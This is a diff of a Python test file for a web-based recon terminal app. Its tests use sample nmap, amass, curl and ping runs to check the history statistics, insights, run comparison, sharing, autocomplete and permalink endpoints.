+            assert abs(data["runs"]["average_elapsed_seconds"] - 15.0) < 0.01
+            assert data["snapshots"] == 1
+            assert data["starred_commands"] == 1
+            assert isinstance(data["active_runs"], int)
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute("DELETE FROM runs WHERE id IN (?, ?, ?, ?)", run_ids)
+                conn.execute("DELETE FROM snapshots WHERE id = ?", (snapshot_id,))
+                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
+                conn.commit()
+
+    def test_stats_tolerates_missing_optional_counter_tables(self):
+        client = get_client()
+        session = "history-stats-missing-tables-" + uuid.uuid4().hex[:8]
+        run_id = f"{session}-ok"
+        try:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                    (
+                        run_id,
+                        session,
+                        "nmap -sT ip.darklab.sh",
+                        "2026-01-01T00:00:00",
+                        "2026-01-01T00:00:10",
+                        0,
+                        "[]",
+                    ),
+                )
+                conn.execute(
+                    "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
+                    (f"{session}-snapshot", session, "snap", "2026-01-01T00:00:00", "[]"),
+                )
+                conn.execute(
+                    "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
+                    (session, "nmap -sT ip.darklab.sh"),
+                )
+                conn.commit()
+
+            with mock.patch("blueprints.history._history_table_exists", return_value=False):
+                data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)
+
+            assert data["runs"]["total"] == 1
+            assert data["runs"]["succeeded"] == 1
+            assert data["snapshots"] == 0
+            assert data["starred_commands"] == 0
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
+                conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
+                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
+                conn.commit()
+
+    def test_insights_empty_session_and_explicit_day_clamps(self):
+        client = get_client()
+        session = "history-insights-empty-" + uuid.uuid4().hex[:8]
+
+        auto = json.loads(client.get("/history/insights?days=auto", headers={"X-Session-ID": session}).data)
+        assert auto["days"] == 28
+        assert len(auto["activity"]) == 28
+        assert auto["first_run_date"] is None
+        assert auto["command_mix"] == []
+        assert auto["constellation"] == []
+        assert auto["events"] == []
+        assert auto["windows"]["activity"]["total_runs"] == 0
+        assert auto["windows"]["command_mix"]["days"] == 90
+        assert auto["windows"]["command_mix"]["sparse"] is True
+        assert auto["windows"]["constellation"]["days"] == 90
+        assert auto["windows"]["constellation"]["sparse"] is True
+
+        long_window = json.loads(client.get("/history/insights?days=999", headers={"X-Session-ID": session}).data)
+        assert long_window["days"] == 365
+        assert len(long_window["activity"]) == 365
+        assert long_window["windows"]["activity"]["days"] == 365
+
+    def test_insights_returns_visual_history_payloads(self):
+        client = get_client()
+        session = "history-insights-" + uuid.uuid4().hex[:8]
+        run_ids = [
+            f"{session}-nmap",
+            f"{session}-curl",
+            f"{session}-terminated",
+            f"{session}-sleep",
+            f"{session}-old",
+        ]
+        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
+        day_sixty = (now - timedelta(days=60)).isoformat()
+        day_ten = (now - timedelta(days=10)).isoformat()
+        day_one = (now - timedelta(days=1)).isoformat()
+        today = now.isoformat()
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[4], session, "whois old.darklab.sh", day_sixty,
+                 (now - timedelta(days=60, seconds=-2)).isoformat(), 0, "[]", 1),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[0], session, "nmap -sT ip.darklab.sh", day_ten,
+                 (now - timedelta(days=10, seconds=-10)).isoformat(), 0, "[]", 12),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[1], session, "curl https://ip.darklab.sh", day_one,
+                 (now - timedelta(days=1, seconds=-5)).isoformat(), 1, "[]", 4),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[2], session, "ping ip.darklab.sh", day_one,
+                 (now - timedelta(days=1, seconds=-15)).isoformat(), -15, "[]", 2),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (run_ids[3], session, "sleep 60", today, None, None, "[]", 0),
+            )
+            conn.commit()
+            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
+            assert data["days"] == 61
+            assert len(data["activity"]) == 61
+            assert data["start_date"] == (now - timedelta(days=60)).date().isoformat()
+            assert data["first_run_date"] == (now - timedelta(days=60)).date().isoformat()
+            assert data["windows"]["activity"]["days"] == 61
+            assert data["windows"]["command_mix"]["days"] == 90
+            assert data["windows"]["constellation"]["days"] == 90
+            assert data["windows"]["command_mix"]["sparse"] is True
+            assert data["windows"]["constellation"]["sparse"] is True
+            assert data["max_day_count"] >= 1
+            roots = {item["root"]: item for item in data["command_mix"]}
+            assert roots["nmap"]["count"] == 1
+            assert roots["nmap"]["succeeded"] == 1
+            assert roots["curl"]["failed"] == 1
+            assert roots["ping"]["count"] == 1
+            assert roots["ping"]["failed"] == 0
+            assert roots["whois"]["count"] == 1
+            assert any(item["root"] == "nmap" for item in data["constellation"])
+            assert data["events"][0]["root"] == "sleep"
+
+            fixed = json.loads(client.get("/history/insights?days=7", headers={"X-Session-ID": session}).data)
+            assert fixed["days"] == 28
+            assert len(fixed["activity"]) == 28
+            assert fixed["windows"]["activity"]["days"] == 28
+            assert fixed["windows"]["command_mix"]["days"] == 90
+            assert any(item["root"] == "nmap" for item in fixed["command_mix"])
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
+                conn.commit()
+
+    def test_insights_falls_back_to_other_when_command_registry_fails(self):
+        client = get_client()
+        session = "history-insights-category-fallback-" + uuid.uuid4().hex[:8]
+        run_id = f"{session}-nmap"
+        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
+        try:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (
+                        run_id,
+                        session,
+                        "nmap -sT ip.darklab.sh",
+                        now.isoformat(),
+                        (now + timedelta(seconds=2)).isoformat(),
+                        0,
+                        "[]",
+                        4,
+                    ),
+                )
+                conn.commit()
+
+            with mock.patch("commands.load_commands_registry", side_effect=RuntimeError("registry down")):
+                data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
+
+            assert data["command_mix"][0]["root"] == "nmap"
+            assert data["command_mix"][0]["category"] == "Other"
+            assert data["constellation"][0]["category"] == "Other"
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
+                conn.commit()
+
+    def test_insights_adaptive_windows_switch_at_command_and_constellation_thresholds(self):
+        client = get_client()
+        session_25 = "history-insights-window-25-" + uuid.uuid4().hex[:8]
+        session_40 = "history-insights-window-40-" + uuid.uuid4().hex[:8]
+        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
+
+        def insert_runs(conn, session, count):
+            for index in range(count):
+                started = now - timedelta(days=index % 20, minutes=index)
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (
+                        f"{session}-{index}",
+                        session,
+                        f"nmap -sT 198.51.100.{index % 250}",
+                        started.isoformat(),
+                        (started + timedelta(seconds=1)).isoformat(),
+                        0,
+                        "[]",
+                        index + 1,
+                    ),
+                )
+
+        try:
+            with sqlite3.connect(DB_PATH) as conn:
+                insert_runs(conn, session_25, 25)
+                insert_runs(conn, session_40, 40)
+                conn.commit()
+
+            data_25 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_25}).data)
+            assert data_25["windows"]["command_mix"]["days"] == 30
+            assert data_25["windows"]["command_mix"]["total_runs"] == 25
+            assert data_25["windows"]["command_mix"]["sparse"] is False
+            assert data_25["windows"]["constellation"]["days"] == 90
+            assert data_25["windows"]["constellation"]["total_runs"] == 25
+            assert data_25["windows"]["constellation"]["sparse"] is True
+
+            data_40 = json.loads(client.get("/history/insights", headers={"X-Session-ID": session_40}).data)
+            assert data_40["windows"]["command_mix"]["days"] == 30
+            assert data_40["windows"]["constellation"]["days"] == 30
+            assert data_40["windows"]["constellation"]["total_runs"] == 40
+            assert data_40["windows"]["constellation"]["plotted_runs"] == 40
+            assert data_40["windows"]["constellation"]["sparse"] is False
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session_25, session_40))
+                conn.commit()
+
+    def test_insights_filters_app_builtin_commands(self):
+        # The Status Monitor's constellation, treemap, heatmap, events, and
+        # max_day_count must all exclude synthetic app built-ins (pwd, whoami,
+        # help, ...) so the visualizations reflect real recon work only.
+        client = get_client()
+        session = "history-insights-builtin-" + uuid.uuid4().hex[:8]
+        run_ids = [
+            f"{session}-nmap",
+            f"{session}-pwd",
+            f"{session}-whoami",
+            f"{session}-help",
+        ]
+        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
+        day_two = (now - timedelta(days=2)).isoformat()
+        day_one = (now - timedelta(days=1)).isoformat()
+        try:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (run_ids[0], session, "nmap -sT ip.darklab.sh", day_two,
+                     (now - timedelta(days=2, seconds=-30)).isoformat(), 0, "[]", 12),
+                )
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (run_ids[1], session, "pwd", day_one,
+                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
+                )
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (run_ids[2], session, "whoami", day_one,
+                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
+                )
+                conn.execute(
+                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
+                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (run_ids[3], session, "help", day_one,
+                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
+                )
+                conn.commit()
+            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
+            mix_roots = {item["root"] for item in data["command_mix"]}
+            constellation_roots = {item["root"] for item in data["constellation"]}
+            event_roots = {item["root"] for item in data["events"]}
+            assert "nmap" in mix_roots
+            assert "nmap" in constellation_roots
+            assert "nmap" in event_roots
+            for builtin in ("pwd", "whoami", "help"):
+                assert builtin not in mix_roots
+                assert builtin not in constellation_roots
+                assert builtin not in event_roots
+            day_two_key = (now - timedelta(days=2)).date().isoformat()
+            day_one_key = (now - timedelta(days=1)).date().isoformat()
+            day_counts = {entry["date"]: entry["count"] for entry in data["activity"]}
+            assert day_counts.get(day_two_key) == 1
+            assert day_counts.get(day_one_key, 0) == 0
+            assert data["max_day_count"] == 1
+            assert data["windows"]["constellation"]["total_runs"] == 1
+            assert data["windows"]["constellation"]["plotted_runs"] == 1
+            assert data["windows"]["command_mix"]["total_runs"] == 1
+        finally:
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
+                conn.commit()
 
     def test_delete_all_returns_ok(self):
         client = get_client()
@@ -1258,6 +2785,52 @@ class TestHistoryRoute:
             conn.commit()
             conn.close()
 
+    def test_history_command_scope_excludes_output_matches(self):
+        client = get_client()
+        session = "history-command-scope-session"
+        run_ids = ["command-scope-1", "command-scope-2"]
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (
+                    run_ids[0],
+                    session,
+                    "file list",
+                    "2026-01-01T00:00:01",
+                    "2026-01-01T00:00:02",
+                    0,
+                    "[]",
+                    "amass results.txt",
+                ),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (
+                    run_ids[1],
+                    session,
+                    "amass enum -d darklab.sh",
+                    "2026-01-01T00:00:03",
+                    "2026-01-01T00:00:04",
+                    0,
+                    "[]",
+                    "",
+                ),
+            )
+            conn.commit()
+            conn.close()
+
+            resp = client.get("/history?type=runs&scope=command&q=amass", headers={"X-Session-ID": session})
+            data = json.loads(resp.data)
+            assert [r["command"] for r in data["runs"]] == ["amass enum -d darklab.sh"]
+        finally:
+            conn = sqlite3.connect(DB_PATH)
+            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
+            conn.commit()
+            conn.close()
+
     def test_history_filters_by_command_root(self):
         client = get_client()
         session = "history-root-session"
@@ -1295,7 +2868,7 @@ class TestHistoryRoute:
     def test_history_filters_by_exit_code_and_recent_date_range(self):
         client = get_client()
         session = "history-date-session"
-        run_ids = ["date-run-1", "date-run-2", "date-run-3"]
+        run_ids = ["date-run-1", "date-run-2", "date-run-3", "date-run-4"]
         recent = datetime.now().replace(microsecond=0)
         try:
             conn = sqlite3.connect(DB_PATH)
@@ -1330,6 +2903,19 @@ class TestHistoryRoute:
                     "[]",
                 ),
             )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                (
+                    run_ids[3],
+                    session,
+                    "ping stopped",
+                    (recent - timedelta(minutes=30)).isoformat(),
+                    (recent - timedelta(minutes=30) + timedelta(seconds=2)).isoformat(),
+                    -15,
+                    "[]",
+                ),
+            )
             conn.commit()
             conn.close()
 
@@ -1339,6 +2925,13 @@ class TestHistoryRoute:
             )
             data = json.loads(resp.data)
             assert [r["command"] for r in data["runs"]] == ["curl recent fail"]
+
+            resp = client.get(
+                "/history?exit_code=-15&date_range=24h",
+                headers={"X-Session-ID": session},
+            )
+            data = json.loads(resp.data)
+            assert [r["command"] for r in data["runs"]] == ["ping stopped"]
         finally:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
@@ -1357,11 +2950,214 @@ class TestHistoryRoute:
         ]
 
         with mock.patch("blueprints.history.active_runs_for_session", return_value=active_runs) as active_mock:
-            resp = client.get("/history/active", headers={"X-Session-ID": session})
+            resp = client.get(
+                "/history/active",
+                headers={"X-Session-ID": session, "X-Client-ID": "client-1"},
+            )
 
         assert resp.status_code == 200
         assert json.loads(resp.data) == {"runs": active_runs}
-        active_mock.assert_called_once_with(session)
+        active_mock.assert_called_once_with(session, client_id="client-1")
+
+    def test_compare_candidates_rank_exact_command_before_same_target(self):
+        client = get_client()
+        session = "compare-candidates-" + uuid.uuid4().hex[:8]
+        rows = [
+            (
+                "cmp-source",
+                session,
+                "nmap -sV darklab.sh",
+                "2026-01-01T00:00:04",
+                "2026-01-01T00:00:06",
+                0,
+                "[]",
+            ),
+            (
+                "cmp-exact",
+                session,
+                "nmap -sV darklab.sh",
+                "2026-01-01T00:00:03",
+                "2026-01-01T00:00:05",
+                0,
+                "[]",
+            ),
+            (
+                "cmp-target",
+                session,
+                "nmap -Pn darklab.sh",
+                "2026-01-01T00:00:02",
+                "2026-01-01T00:00:04",
+                0,
+                "[]",
+            ),
+            (
+                "cmp-root",
+                session,
+                "nmap scanme.nmap.org",
+                "2026-01-01T00:00:01",
+                "2026-01-01T00:00:03",
+                0,
+                "[]",
+            ),
+        ]
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.executemany(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?)",
+                rows,
+            )
+            conn.commit()
+            conn.close()
+
+            resp = client.get(
+                "/history/cmp-source/compare-candidates",
+                headers={"X-Session-ID": session},
+            )
+            data = json.loads(resp.data)
+
+            assert resp.status_code == 200
+            assert [item["id"] for item in data["candidates"][:3]] == [
+                "cmp-exact",
+                "cmp-target",
+                "cmp-root",
+            ]
+            assert data["candidates"][0]["confidence"] == "exact_command"
+            assert data["candidates"][1]["confidence"] == "same_target"
+            assert data["candidates"][2]["confidence"] == "same_command"
+        finally:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.commit()
+            conn.close()
+
+    def test_compare_history_runs_returns_metadata_and_changed_lines(self):
+        client = get_client()
+        session = "compare-runs-" + uuid.uuid4().hex[:8]
+        left_output = json.dumps([
+            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
+            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
+            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
+            {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
+            {"text": "[process exited with code 0]", "cls": "exit-ok"},
+        ])
+        right_output = json.dumps([
+            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
+            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
+            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
+            {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
+            {"text": "[process exited with code 0]", "cls": "exit-ok"},
+        ])
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (
+                    "cmp-left",
+                    session,
+                    "nmap darklab.sh",
+                    "2026-01-01T00:00:01",
+                    "2026-01-01T00:00:03",
+                    0,
+                    left_output,
+                    4,
+                ),
+            )
+            conn.execute(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (
+                    "cmp-right",
+                    session,
+                    "nmap darklab.sh",
+                    "2026-01-01T00:00:04",
+                    "2026-01-01T00:00:09",
+                    0,
+                    right_output,
+                    4,
+                ),
+            )
+            conn.commit()
+            conn.close()
+
+            resp = client.get(
+                "/history/compare?left=cmp-left&right=cmp-right",
+                headers={"X-Session-ID": session},
+            )
+            data = json.loads(resp.data)
+
+            assert resp.status_code == 200
+            assert data["left"]["command"] == "nmap darklab.sh"
+            assert data["right"]["duration_seconds"] == 5
+            assert data["deltas"]["duration_seconds"]["delta"] == 3
+            assert data["deltas"]["findings"]["delta"] == 0
+            assert len(data["sections"]["changed"]) == 1
+            changed = data["sections"]["changed"][0]
+            assert changed["removed"]["text"].endswith("23:22 UTC")
+            assert changed["added"]["text"].endswith("23:21 UTC")
+            assert any(segment["changed"] for segment in changed["removed"]["segments"])
+            assert any(segment["changed"] for segment in changed["added"]["segments"])
+            assert [line["text"] for line in data["sections"]["added"]] == ["443/tcp open https"]
+            assert [line["text"] for line in data["sections"]["removed"]] == ["8080/tcp open http-proxy"]
+            assert all("process exited" not in line["text"] for line in data["sections"]["added"])
+        finally:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.commit()
+            conn.close()
+
+    def test_compare_history_runs_leaves_very_long_lines_unpaired(self):
+        client = get_client()
+        session = "compare-long-lines-" + uuid.uuid4().hex[:8]
+        left_line = "scanner output " + ("a" * 4500) + " old"
+        right_line = "scanner output " + ("a" * 4500) + " new"
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            conn.executemany(
+                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                [
+                    (
+                        "cmp-long-left",
+                        session,
+                        "nmap darklab.sh",
+                        "2026-01-01T00:00:01",
+                        "2026-01-01T00:00:03",
+                        0,
+                        json.dumps([{"text": left_line, "cls": "", "line_index": 0}]),
+                        1,
+                    ),
+                    (
+                        "cmp-long-right",
+                        session,
+                        "nmap darklab.sh",
+                        "2026-01-01T00:00:04",
+                        "2026-01-01T00:00:09",
+                        0,
+                        json.dumps([{"text": right_line, "cls": "", "line_index": 0}]),
+                        1,
+                    ),
+                ],
+            )
+            conn.commit()
+            conn.close()
+
+            resp = client.get(
+                "/history/compare?left=cmp-long-left&right=cmp-long-right",
+                headers={"X-Session-ID": session},
+            )
+            data = json.loads(resp.data)
+
+            assert resp.status_code == 200
+            assert data["sections"]["changed"] == []
+            assert [line["text"] for line in data["sections"]["removed"]] == [left_line]
+            assert [line["text"] for line in data["sections"]["added"]] == [right_line]
+        finally:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.commit()
+            conn.close()
 
 
 # ── /share ────────────────────────────────────────────────────────────────────
@@ -1607,11 +3403,11 @@ class TestShareRoute:
             headers={"X-Session-ID": "test-session"}
         )
         share_id = json.loads(create_resp.data)["id"]
-        client.set_cookie("pref_theme_name", "blue_paper")
+        client.set_cookie("pref_theme_name", "apricot_sand")
         resp = client.get(f"/share/{share_id}")
         body = resp.get_data(as_text=True)
         assert 'class="permalink-page"' in body
-        assert 'data-theme="blue_paper"' in body
+        assert 'data-theme="apricot_sand"' in body
         assert '/static/css/styles.css' in body
 
     def test_get_share_html_contains_label(self):
@@ -1772,13 +3568,34 @@ class TestAutocompleteRoute:
         assert isinstance(data["suggestions"], list)
         assert "context" in data
         assert isinstance(data["context"], dict)
+        assert "builtin_command_roots" in data
+        assert "commands" in data["builtin_command_roots"]
+        assert "ip" in data["builtin_command_roots"]
+        assert "status" in data["builtin_command_roots"]
 
     def test_returns_configured_context(self):
         client = get_client()
-        with mock.patch("blueprints.content.load_autocomplete_context", return_value={"nmap": {"flags": []}}):
+        with mock.patch("blueprints.content.load_autocomplete_context_from_commands_registry", return_value={
+            "nmap": {"flags": []},
+        }):
             data = json.loads(client.get("/autocomplete").data)
         assert data["suggestions"] == []
         assert "nmap" in data["context"]
+
+    def test_returns_wordlist_autocomplete_catalog(self):
+        client = get_client()
+        with mock.patch("blueprints.content.wordlist_autocomplete_items", return_value=[
+            {
+                "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+                "label": "Discovery/DNS/subdomains-top1million-5000.txt",
+                "description": "DNS wordlist",
+                "wordlist_category": "dns",
+            },
+        ]):
+            data = json.loads(client.get("/autocomplete").data)
+
+        assert data["wordlists"][0]["wordlist_category"] == "dns"
+        assert data["wordlists"][0]["value"].endswith("subdomains-top1million-5000.txt")
 
 
 # ── /history session isolation ────────────────────────────────────────────────
@@ -1899,7 +3716,7 @@ class TestRunPermalinkRoute:
             import gzip
             from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
             ensure_run_output_dir()
-            with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
+            with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                 for line in full_output_lines:
                     f.write(line + "\n")
 
@@ -1911,7 +3728,7 @@ class TestRunPermalinkRoute:
         conn.commit()
         conn.close()
         try:
-            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
+            os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
         except FileNotFoundError:
             pass
 
@@ -1919,7 +3736,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-html-test-run"
         self._insert_run(run_id, "ping google.com", ["64 bytes"])
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             assert resp.status_code == 200
             assert b"<html" in resp.data.lower()
         finally:
@@ -1929,7 +3746,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-cmd-test-run"
         self._insert_run(run_id, "nmap -sV 10.0.0.1")
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             assert b"nmap -sV 10.0.0.1" in resp.data
         finally:
             self._delete_run(run_id)
@@ -1938,7 +3755,27 @@ class TestRunPermalinkRoute:
         run_id = "permalink-json-test-run"
         self._insert_run(run_id, "dig google.com", ["answer section"])
         try:
-            data = json.loads(get_client().get(f"/history/{run_id}?json").data)
+            data = json.loads(
+                get_client().get(
+                    f"/history/{run_id}?json",
+                    headers={"X-Session-ID": "test-session"},
+                ).data
+            )
+            assert data["command"] == "dig google.com"
+            assert "answer section" in data["output"]
+        finally:
+            self._delete_run(run_id)
+
+    def test_json_view_is_a_bearer_permalink_across_sessions(self):
+        run_id = "permalink-other-session-test-run"
+        self._insert_run(run_id, "dig google.com", ["answer section"])
+        try:
+            data = json.loads(
+                get_client().get(
+                    f"/history/{run_id}?json",
+                    headers={"X-Session-ID": "other-session"},
+                ).data
+            )
             assert data["command"] == "dig google.com"
             assert "answer section" in data["output"]
         finally:
@@ -1954,7 +3791,12 @@ class TestRunPermalinkRoute:
             full_output_lines=["full line 1", "full line 2"],
         )
         try:
-            data = json.loads(get_client().get(f"/history/{run_id}?json").data)
+            data = json.loads(
+                get_client().get(
+                    f"/history/{run_id}?json",
+                    headers={"X-Session-ID": "test-session"},
+                ).data
+            )
             assert data["command"] == "man curl"
             assert data["output"] == ["full line 1", "full line 2"]
         finally:
@@ -1971,7 +3813,12 @@ class TestRunPermalinkRoute:
             full_output_lines=["full line 1", "full line 2"],
         )
         try:
-            data = json.loads(get_client().get(f"/history/{run_id}?json&preview=1").data)
+            data = json.loads(
+                get_client().get(
+                    f"/history/{run_id}?json&preview=1",
+                    headers={"X-Session-ID": "test-session"},
+                ).data
+            )
             assert data["command"] == "man curl"
             assert data["output"] == ["preview line"]
             assert (
@@ -1986,7 +3833,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-ct-test-run"
         self._insert_run(run_id, "ping test")
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             assert "text/html" in resp.content_type
         finally:
             self._delete_run(run_id)
@@ -2001,7 +3848,7 @@ class TestRunPermalinkRoute:
             full_output_lines=["full line 1", "full line 2"],
         )
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             assert b"full line 1" in resp.data
             assert b"preview line" not in resp.data
         finally:
@@ -2011,7 +3858,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-preview-truncated-test-run"
         self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             assert b"preview truncated" in resp.data
         finally:
             self._delete_run(run_id)
@@ -2020,7 +3867,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-toggle-test-run"
         self._insert_run(run_id, "ping google.com", ["64 bytes"])
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             body = resp.get_data(as_text=True)
             assert 'id="toggle-ln"' in body
             assert 'id="toggle-ts" disabled' in body
@@ -2035,7 +3882,7 @@ class TestRunPermalinkRoute:
         ]
         self._insert_run(run_id, "ping google.com", structured_preview)
         try:
-            resp = get_client().get(f"/history/{run_id}")
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": "test-session"})
             body = resp.get_data(as_text=True)
             assert "$ ping google.com" in body
             assert 'id="toggle-ts"' in body
@@ -2065,7 +3912,10 @@ class TestRunPermalinkRoute:
             ["HTTP/1.1 200 OK"],
         )
         try:
-            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
+            body = get_client().get(
+                f"/history/{run_id}",
+                headers={"X-Session-ID": "test-session"},
+            ).get_data(as_text=True)
             assert "exit 0" in body
             assert "meta-badge-ok" in body
         finally:
@@ -2079,7 +3929,10 @@ class TestRunPermalinkRoute:
             ["curl: (6) Could not resolve host"],
         )
         try:
-            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
+            body = get_client().get(
+                f"/history/{run_id}",
+                headers={"X-Session-ID": "test-session"},
+            ).get_data(as_text=True)
             assert "exit 6" in body
             assert "meta-badge-fail" in body
         finally:
